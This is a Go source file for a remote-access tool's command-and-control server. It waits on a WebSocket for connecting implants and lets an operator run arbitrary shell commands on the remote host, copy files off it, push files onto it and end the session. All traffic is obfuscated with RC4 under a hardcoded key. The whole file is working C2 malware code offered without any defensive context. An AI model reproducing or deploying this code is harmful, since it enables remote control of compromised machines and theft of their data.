package main

import (
	"bufio"
	"crypto/rc4"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{}

func input(prompt string) string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(prompt)
	input, err := reader.ReadString('\n')
	if err != nil {
		log.Fatal(err)
	}
	return strings.Trim(input, "\r\n")
}

func createUploadFolder() error {
	if _, err := os.Stat("upload"); os.IsNotExist(err) {
		err := os.Mkdir("upload", 0755)
		if err != nil {
			log.Fatal("Could not create upload folder")
		}
	}
	return nil
}

func readFile(path string) ([]byte, error) {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return nil, fmt.Errorf("file does not exist")
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("file could not be read")
	}

	return data, nil
}

func writeFile(path string, data []byte) error {
	file, err := os.Create(path)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.Write(data)
	if err != nil {
		return err
	}

	return nil
}

func encrypt(data []byte) []byte {
	// RC4 encrypt with hardcoded shared key
	key := []byte("n1ss3b4nd3ns_n1ss3w4r3")
	cipher, err := rc4.NewCipher(key)
	if err != nil {
		log.Fatal(err)
	}

	result := make([]byte, len(data))
	cipher.XORKeyStream(result, data)
	return result
}

func send(ws *websocket.Conn, data []byte) {
	encrypted := encrypt(data)
	err := ws.WriteMessage(websocket.TextMessage, []byte(encrypted))
	if err != nil {
		log.Fatal(err)
	}
}

func receive(ws *websocket.Conn) []byte {
	_, message, err := ws.ReadMessage()
	if err != nil {
		log.Fatal(err)
	}
	return encrypt(message)
}

func do_cmd(ws *websocket.Conn) {
	cmd := input("> ")
	send(ws, []byte("cmd"))
	send(ws, []byte(cmd))
	status := int(receive(ws)[0])
	result := string(receive(ws))

	if status == 0 {
		log.Println(result)
	} else {
		log.Printf("Error (%d): %s\n", status, result)
	}
}

func do_upload(ws *websocket.Conn) {
	path := input("Full path: ")
	send(ws, []byte("upload"))
	send(ws, []byte(path))

	status := int(receive(ws)[0])
	result := receive(ws)
	if status == 0 {
		_, filename := filepath.Split(path)
		upload_path := filepath.Join("upload", filename)
		err := writeFile(upload_path, result)
		if err != nil {
			log.Println("Could not write to file")
		} else {
			log.Printf("Uploaded file to %s", upload_path)
		}
	} else {
		log.Printf("Error (%d): %s\n", status, string(result))
	}
}

func do_download(ws *websocket.Conn) {
	server_path := input("File path (server): ")
	data, err := readFile(server_path)
	if err != nil {
		log.Printf("Could not read file %s\n", server_path)
		return
	}

	client_path := input("Full download path (client): ")

	send(ws, []byte("download"))
	send(ws, []byte(client_path))
	send(ws, data)

	status := int(receive(ws)[0])
	result := string(receive(ws))
	if status == 0 {
		log.Println(result)
	} else {
		log.Printf("Error (%d): %s\n", status, result)
	}
}

func handler(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Print("upgrade:", err)
		return
	}
	defer ws.Close()

	id := string(receive(ws))
	log.Printf("New connection from ID %s\n", id)
	send(ws, []byte(fmt.Sprint("ack ", id)))

	for {
		choice := strings.ToLower(input("Choice (cmd, upload, download, kill): "))
		switch string(choice) {
		case "cmd":
			do_cmd(ws)
		case "upload":
			do_upload(ws)
		case "download":
			do_download(ws)
		case "kill":
			send(ws, []byte("kill"))
			log.Println()
			return
		default:
			log.Println("Invalid choice...")
		}
		log.Println()
	}
}

func main() {
	log.SetFlags(0)
	log.Println("Starting server...")
	createUploadFolder()
	http.HandleFunc("/ws", handler)
	log.Println("Waiting for connections...")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
